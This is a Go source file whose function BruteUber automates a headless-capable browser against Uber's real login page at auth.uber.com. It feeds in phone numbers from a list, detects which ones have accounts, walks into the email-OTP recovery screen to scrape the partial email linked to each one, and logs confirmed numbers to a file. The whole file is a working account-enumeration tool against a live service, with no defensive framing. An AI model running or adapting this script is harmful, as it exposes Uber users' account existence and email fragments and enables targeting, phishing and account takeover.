package bruteforceSite

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"github.com/chromedp/chromedp"
	"github.com/chromedp/chromedp/kb"
)

func BruteUber() {
	payloads := []string{}
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		payloads = append(payloads, strings.Replace(scanner.Text(), "+", "", -1))
	}

	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, "Erro de leitura:", err)
	}
	url := "https://auth.uber.com/v2"
	options := []chromedp.ExecAllocatorOption{
		chromedp.Flag("ignore-certificate-errors", "1"),
		chromedp.Flag("headless", false), // set headless to false
		chromedp.Flag("disable-gpu", true),
	}
	ctx, cancel := chromedp.NewContext(
		context.Background(),
		chromedp.WithDebugf(log.Printf),
	)
	defer cancel()
	ctx, cancel = chromedp.NewExecAllocator(ctx, options...)
	defer cancel()
	ctx, cancel = chromedp.NewContext(ctx)
	defer cancel()
	ctx, cancel = context.WithTimeout(ctx, 1800*time.Second)
	defer cancel()
	err := chromedp.Run(ctx,
		chromedp.Navigate(url),
	)
	if err != nil {
		log.Fatal(err)
	}

	errorUser := ""
	emailUser := ""
	for indexPayload := 0; indexPayload < len(payloads); indexPayload++ {
		numberphone := "+" + payloads[indexPayload]
		err := chromedp.Run(ctx,

			chromedp.WaitVisible(`#PHONE_NUMBER_or_EMAIL_ADDRESS`, chromedp.ByID),
			chromedp.SendKeys(`#PHONE_NUMBER_or_EMAIL_ADDRESS`, numberphone, chromedp.ByID),
			chromedp.Sleep(500*time.Millisecond),
			chromedp.KeyEvent(kb.Enter),
			chromedp.Sleep(500*time.Millisecond),

			chromedp.WaitVisible(`[data-baseweb='pin-code']`, chromedp.ByQuery),
			chromedp.WaitVisible(`#alt-action-help-v2`, chromedp.ByQuery),
			chromedp.Evaluate(`document.querySelector("#alt-action-help-v2")?"":"User not Exist"`, &errorUser),
			chromedp.Click(`#alt-action-help-v2`, chromedp.ByID),

			//chromedp.WaitVisible(`#alt-more-options-modal-email`, chromedp.ByID),
			chromedp.Sleep(1500*time.Millisecond),

			chromedp.Evaluate(`document.querySelector("#alt-more-options-modal-email")?"":"Function Email Not Exist"`, &errorUser),
			chromedp.Click(`#alt-more-options-modal-email`, chromedp.ByID),

			//chromedp.WaitReady(`[screen-test='EMAIL_OTP_CODE']`, chromedp.ByQuery),
			chromedp.Sleep(1500*time.Millisecond),
			chromedp.Evaluate(`document.querySelector("[screen-test=EMAIL_OTP_CODE]").innerText.split("\n")[1]`, &emailUser),
		)
		if err != nil {
			log.Fatal(err)
		}

		if errorUser != "" {
			fmt.Println("[-] User Not Exist:", numberphone)
		} else {
			WriteToFile("numbers-uber.txt", numberphone+"\n", "./numberphone/")
			fmt.Println("[+] User Exist:", numberphone)
			fmt.Println("    [+] Linked Email Initials:", emailUser)
		}
		time.Sleep(1 * time.Second)
	}
}
